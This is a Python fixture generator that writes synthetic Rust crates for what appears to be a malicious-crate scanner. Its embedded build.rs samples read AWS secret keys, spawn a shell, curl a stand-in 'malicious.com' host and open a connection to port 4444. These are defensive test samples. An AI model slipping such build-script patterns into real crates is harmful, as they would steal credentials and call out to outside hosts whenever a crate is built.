import os
import random
import shutil
from pathlib import Path

from crateshield.config import ROOT

SYNTHETIC_DIR = ROOT / "data" / "synthetic_crates"

BUILD_RS_NETWORK = """
use std::net::TcpStream;
fn main() {
    if let Ok(mut stream) = TcpStream::connect("192.168.1.1:80") {
        // Exfiltration...
    }
}
"""

BUILD_RS_SPAWN = """
use std::process::Command;
fn main() {
    Command::new("curl").arg("http://malicious.com").spawn().ok();
}
"""

BUILD_RS_ENV = """
use std::env;
fn main() {
    let _key = env::var("AWS_ACCESS_KEY_ID").unwrap_or_default();
}
"""

BUILD_RS_COMBINED = """
use std::process::Command;
use std::net::TcpStream;
use std::env;
fn main() {
    let key = env::var("AWS_SECRET_ACCESS_KEY").unwrap_or_default();
    Command::new("sh").arg("-c").arg("echo pwned").output().unwrap();
    TcpStream::connect("10.0.0.1:4444").unwrap();
}
"""

LIB_RS_UNSAFE = """
pub fn do_something_unsafe() {
    unsafe {
        let ptr = 0xdeadbeef as *mut u32;
        *ptr = 1;
    }
}
"""

LIB_RS_SAFE = """
pub fn do_something_safe() {
    println!("I am a completely benign crate.");
}
"""

def generate_synthetic_crates(count: int = 50) -> None:
    if SYNTHETIC_DIR.exists():
        shutil.rmtree(SYNTHETIC_DIR)
    SYNTHETIC_DIR.mkdir(parents=True, exist_ok=True)
    
    random.seed(42)  # For reproducible synthetic fixtures
    
    for i in range(1, count + 1):
        crate_name = f"syn_malicious_{i}"
        crate_dir = SYNTHETIC_DIR / crate_name
        crate_dir.mkdir(parents=True)
        
        # 1. Cargo.toml
        cargo_toml = f"""[package]
name = "{crate_name}"
version = "0.1.0"
edition = "2021"

[dependencies]
"""
        # Inject suspicious deps occasionally
        if random.random() < 0.2:
            cargo_toml += 'serde = "1.0"\ntokio = { version = "1.0", features = ["full"] }\n'
        
        (crate_dir / "Cargo.toml").write_text(cargo_toml)
        
        # 2. build.rs (80% chance of having a malicious build.rs)
        if random.random() < 0.8:
            build_flavor = random.choice([BUILD_RS_NETWORK, BUILD_RS_SPAWN, BUILD_RS_ENV, BUILD_RS_COMBINED])
            (crate_dir / "build.rs").write_text(build_flavor)
            
        # 3. src/lib.rs (60% chance of high unsafe density)
        src_dir = crate_dir / "src"
        src_dir.mkdir()
        if random.random() < 0.6:
            # Add multiple unsafe blocks
            lib_content = LIB_RS_UNSAFE * random.randint(2, 6)
        else:
            lib_content = LIB_RS_SAFE
            
        (src_dir / "lib.rs").write_text(lib_content)
        
    print(f"Generated {count} synthetic malicious crates in {SYNTHETIC_DIR}")
